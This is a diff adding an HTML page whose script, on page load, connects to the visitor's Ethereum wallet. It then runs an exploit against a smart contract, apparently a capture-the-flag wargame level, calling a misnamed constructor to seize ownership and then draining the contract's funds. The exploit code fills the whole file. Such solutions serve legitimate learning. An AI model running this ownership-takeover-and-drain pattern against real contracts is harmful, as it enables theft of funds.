@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script>
+      (async () => {
+        let ethAddr;
+        if (window.ethereum) {
+          window.web3 = new Web3(window.ethereum);
+          let conn = await window.ethereum.enable();
+          if (conn.length > 0) {
+            ethAddr = conn[0];
+          }
+        } else {
+          return;
+        }
+
+        const falloutContrAddr = "0x989808898aC3082B74758049C44c610C011eE9fd";
+        const falloutContract = await new window.web3.eth.Contract(
+          [
+            {
+              inputs: [],
+              name: "Fal1out",
+              outputs: [],
+              stateMutability: "payable",
+              type: "function",
+            },
+            {
+              inputs: [],
+              name: "allocate",
+              outputs: [],
+              stateMutability: "payable",
+              type: "function",
+            },
+            {
+              inputs: [
+                {
+                  internalType: "address",
+                  name: "allocator",
+                  type: "address",
+                },
+              ],
+              name: "allocatorBalance",
+              outputs: [
+                {
+                  internalType: "uint256",
+                  name: "",
+                  type: "uint256",
+                },
+              ],
+              stateMutability: "view",
+              type: "function",
+            },
+            {
+              inputs: [],
+              name: "collectAllocations",
+              outputs: [],
+              stateMutability: "nonpayable",
+              type: "function",
+            },
+            {
+              inputs: [],
+              name: "owner",
+              outputs: [
+                {
+                  internalType: "address payable",
+                  name: "",
+                  type: "address",
+                },
+              ],
+              stateMutability: "view",
+              type: "function",
+            },
+            {
+              inputs: [
+                {
+                  internalType: "address payable",
+                  name: "allocator",
+                  type: "address",
+                },
+              ],
+              name: "sendAllocation",
+              outputs: [],
+              stateMutability: "nonpayable",
+              type: "function",
+            },
+          ],
+          falloutContrAddr
+        );
+
+        const params = { from: ethAddr, value: Web3.utils.toWei("0.0005") };
+
+        await falloutContract.methods.Fal1out().send(params);
+        await falloutContract.methods
+          .collectAllocations()
+          .send({ from: params.from });
+      })();
+    </script>
+  </body>
+</html>
